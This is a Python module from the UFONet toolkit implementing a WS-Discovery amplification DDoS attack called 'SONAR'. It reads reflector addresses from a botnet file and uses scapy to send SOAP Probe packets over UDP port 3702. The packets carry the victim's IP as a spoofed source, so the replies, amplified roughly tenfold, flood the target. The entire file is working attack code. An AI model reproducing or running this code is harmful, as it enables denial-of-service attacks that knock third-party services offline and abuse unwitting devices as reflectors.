#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, uuid
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

wsdisco_file = "botnet/wsdisco.txt"

# UFONet WS-Discovery Amplification (SONAR) - amp factor ~10x (SOAP Probe)
def sonarize(ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(wsdisco_file)
        if _empty:
            print("[Error] [AI] [SONAR] botnet/wsdisco.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("SONAR", wsdisco_file, kind="wsdisco")
            return
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [SONAR] Pinging 'sonar' ["+str(n)+"] through the deep! -> [SLOWING!]")
            for r in reflectors:
                try:
                    msg_id = str(uuid.uuid4())
                    soap = (
                        '<?xml version="1.0" encoding="utf-8"?>'
                        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
                        'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
                        'xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery">'
                        '<soap:Header>'
                        '<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
                        '<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>'
                        '<wsa:MessageID>urn:uuid:' + msg_id + '</wsa:MessageID>'
                        '</soap:Header>'
                        '<soap:Body><wsd:Probe/></soap:Body>'
                        '</soap:Envelope>'
                    ).encode('utf-8')
                    sport = random.randint(2000, 65535)
                    packet = IP(dst=r, src=ip) / UDP(sport=sport, dport=3702) / Raw(load=soap)
                    send(packet, verbose=0)
                    print("[Info] [AI] [SONAR] Pinged 'sonar' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except:
                    print("[Info] [AI] [SONAR] Pinged 'sonar' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [SONAR] Failing to engage... -> Is still target online? -> [Checking!]")

class WSDISCO(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] WS-Discovery Amplification (SONAR) is ready to fire: [", rounds, "sonars ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [SONAR] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        sonarize(ip, rounds)
